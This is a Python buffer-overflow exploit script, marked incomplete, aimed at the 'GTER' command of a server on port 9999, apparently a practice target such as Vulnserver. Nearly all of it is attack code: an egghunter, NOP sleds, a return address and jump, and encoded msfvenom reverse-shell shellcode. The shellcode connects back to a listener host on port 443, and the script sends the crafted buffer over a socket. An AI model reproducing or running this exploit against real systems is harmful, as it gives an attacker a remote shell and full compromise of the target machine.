#!/usr/bin/python
# -*- coding: utf-8 -*-
# NOT COMPLETE #

import socket, os, sys

#32 bytes - W00TW00T \x57\x30\x30\x54
#D3RP 44 33 52 50 

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x50\x52\x33\x44\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/shell_reverse_tcp -f python -b "\x00\x0a\x0d" -v shell -e x86/shikata_ga_nai LHOST=192.168.10.58 LPORT=443
#Payload size: 351 bytes
shell =  ""
shell += "\xda\xdd\xba\x49\xeb\xd3\x1f\xd9\x74\x24\xf4\x5e\x2b"
shell += "\xc9\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\x1f\xf8\x31"
shell += "\xea\x63\x16\x37\x15\x9b\xe7\x58\x9f\x7e\xd6\x58\xfb"
shell += "\x0b\x49\x69\x8f\x59\x66\x02\xdd\x49\xfd\x66\xca\x7e"
shell += "\xb6\xcd\x2c\xb1\x47\x7d\x0c\xd0\xcb\x7c\x41\x32\xf5"
shell += "\x4e\x94\x33\x32\xb2\x55\x61\xeb\xb8\xc8\x95\x98\xf5"
shell += "\xd0\x1e\xd2\x18\x51\xc3\xa3\x1b\x70\x52\xbf\x45\x52"
shell += "\x55\x6c\xfe\xdb\x4d\x71\x3b\x95\xe6\x41\xb7\x24\x2e"
shell += "\x98\x38\x8a\x0f\x14\xcb\xd2\x48\x93\x34\xa1\xa0\xe7"
shell += "\xc9\xb2\x77\x95\x15\x36\x63\x3d\xdd\xe0\x4f\xbf\x32"
shell += "\x76\x04\xb3\xff\xfc\x42\xd0\xfe\xd1\xf9\xec\x8b\xd7"
shell += "\x2d\x65\xcf\xf3\xe9\x2d\x8b\x9a\xa8\x8b\x7a\xa2\xaa"
shell += "\x73\x22\x06\xa1\x9e\x37\x3b\xe8\xf6\xf4\x76\x12\x07"
shell += "\x93\x01\x61\x35\x3c\xba\xed\x75\xb5\x64\xea\x7a\xec"
shell += "\xd1\x64\x85\x0f\x22\xad\x42\x5b\x72\xc5\x63\xe4\x19"
shell += "\x15\x8b\x31\x8d\x45\x23\xea\x6e\x35\x83\x5a\x07\x5f"
shell += "\x0c\x84\x37\x60\xc6\xad\xd2\x9b\x81\x11\x8a\xa9\x6b"
shell += "\xfa\xc9\xad\x8a\x41\x44\x4b\xe6\xa5\x01\xc4\x9f\x5c"
shell += "\x08\x9e\x3e\xa0\x86\xdb\x01\x2a\x25\x1c\xcf\xdb\x40"
shell += "\x0e\xb8\x2b\x1f\x6c\x6f\x33\xb5\x18\xf3\xa6\x52\xd8"
shell += "\x7a\xdb\xcc\x8f\x2b\x2d\x05\x45\xc6\x14\xbf\x7b\x1b"
shell += "\xc0\xf8\x3f\xc0\x31\x06\xbe\x85\x0e\x2c\xd0\x53\x8e"
shell += "\x68\x84\x0b\xd9\x26\x72\xea\xb3\x88\x2c\xa4\x68\x43"
shell += "\xb8\x31\x43\x54\xbe\x3d\x8e\x22\x5e\x8f\x67\x73\x61"
shell += "\x20\xe0\x73\x1a\x5c\x90\x7c\xf1\xe4\xa0\x36\x5b\x4c"
shell += "\x29\x9f\x0e\xcc\x34\x20\xe5\x13\x41\xa3\x0f\xec\xb6"
shell += "\xbb\x7a\xe9\xf3\x7b\x97\x83\x6c\xee\x97\x30\x8c\x3b"

nops = "P3RDP3RD" + "\x90" * 10
crap = "\x43" * 2000

print "Egghunter Length " + str(len(egghunter))
buffer = "GTER "
buffer+= "\x41" *90 + "\x90" * 15 + egghunter + "\x90" * 14 + "\xaf\x11\x50\x62" + "\xeb\xc4" + crap 

print "[*] Sending evil shenanigans - be patient"
print "[*] Sending " + str(len(buffer)) + " bytes to server"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.10.176', 9999))
#s.recv(1024)
s.send(buffer)
s.close()
